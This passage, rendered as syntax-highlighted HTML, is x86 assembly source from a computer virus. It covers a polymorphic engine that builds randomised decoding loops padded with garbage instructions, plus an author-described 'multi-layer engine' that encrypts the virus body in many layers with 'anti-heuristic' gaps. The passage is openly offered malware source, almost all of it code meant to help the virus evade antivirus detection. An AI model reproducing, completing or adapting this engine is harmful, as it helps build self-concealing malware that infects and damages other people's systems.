        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;is it imm0 ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_oc_imm_ok</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">         </span><span class="sc1">;save imm to stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;next number in imm</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cv_oc_generate_imm</span><span class="sc0">

    </span><span class="sc5">__cv_oc_imm_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;esi = start of encode instruction</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;AL = opposite instruction (add &lt;=&gt; sub)</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;is it previous or next instruction ?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;esi = decode instruction</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;al = (en/de)code instruction</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">        </span><span class="sc1">;separate reg only</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">;change register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;save encode instruction to stack</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_instr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cv_next_loop</span><span class="sc0">

        </span><span class="sc1">;now, we must find out the crypt value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C08Bh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;save destination value to EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;ret = out of call</span><span class="sc0">

        </span><span class="sc1">;to find out crypt value we must call decode function</span><span class="sc0">
        </span><span class="sc1">;output:    eax = crypt value</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_place</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc1">;save into last_reg our crypt value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_place</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc1">;now, we must write decode instructions to old EDI</span><span class="sc0">
    </span><span class="sc5">__cv_oc_out_of_stack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_oc_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cv_oc_out_of_stack</span><span class="sc0">
    </span><span class="sc5">__cv_oc_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;flag from stack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ last decoding loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function encrypts virus body like 3rd decoding loop.</span><span class="sc0">
        </span><span class="sc1">;The algorithm is in front of the virus. It  means, multi-</span><span class="sc0">
        </span><span class="sc1">;layer algorithm is behind virus, then is jump to back and</span><span class="sc0">
        </span><span class="sc1">;then is next decoding loop.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__pllg_memory</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;decoding loop mem</span><span class="sc0">
        </span><span class="sc5">__pllg_countreg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;counter register</span><span class="sc0">
        </span><span class="sc5">__pllg_indexreg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;index register</span><span class="sc0">
        </span><span class="sc5">__pllg_codereg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;code register</span><span class="sc0">
        </span><span class="sc5">__pllg_lsize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;loop size</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_lloop_generate</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; allocate memory for decoding loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; generate index and its register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
    </span><span class="sc5">__pllg_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000100b</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__pllg_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_indexreg</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">            </span><span class="sc1">;CALL</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_indexreg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_indexreg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">          </span><span class="sc1">;do place for ADD</span><span class="sc0">

        </span><span class="sc1">; generate counter register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_countreg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc1">; generate code register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_codereg</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc1">; generate XOR machanism</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_codereg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_indexreg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; generate next index value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_indexreg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; geneerate next counter value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_countreg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; generate comparing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F881h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_countreg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ identification</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; generate do-nothing instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc5">__pllg_align</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pllg_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__pllg_align</span><span class="sc0">
    </span><span class="sc5">__pllg_finish</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; change index value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; do place for this algorithm</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">__pllg_lsize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size2</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size3</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size2</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__movsd_back</span><span class="sc0">

        </span><span class="sc1">; copy this algorithm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; run that algorithm</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">

        </span><span class="sc1">; dealloc memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ multi-layer engine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function generates multi-layer map. And because I am</span><span class="sc0">
        </span><span class="sc1">;crazy, this is true multi-layer engine. So look here:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; Every polymorphic en-    vs.   Every multi-layer engine</span><span class="sc0">
        </span><span class="sc1">; gine encodes l. this:      encodes  in  this   way:</span><span class="sc0">
        </span><span class="sc1">;      Â  (virus_start)         Â         Â</span><span class="sc0">
        </span><span class="sc1">;      ³                ³ 1st     ³ 2nd</span><span class="sc0">
        </span><span class="sc1">;      ³                ³ layer   ³ layer</span><span class="sc0">
        </span><span class="sc1">;      ³                ³         ³</span><span class="sc0">
        </span><span class="sc1">;        (down or up)                         etc.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;But my multi-layer engine has these features:</span><span class="sc0">
        </span><span class="sc1">;   * randomly generated layer's movement (down or up)</span><span class="sc0">
        </span><span class="sc1">;   * maximal is 986 layers</span><span class="sc0">
        </span><span class="sc1">;   * typical is 68 layers</span><span class="sc0">
        </span><span class="sc1">;   * layers' buffer with gaps (anti-heuristic)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;My resulting coding progress:</span><span class="sc0">
        </span><span class="sc1">;      Â  Ú¿         ù       ù     ¿  three layers</span><span class="sc0">
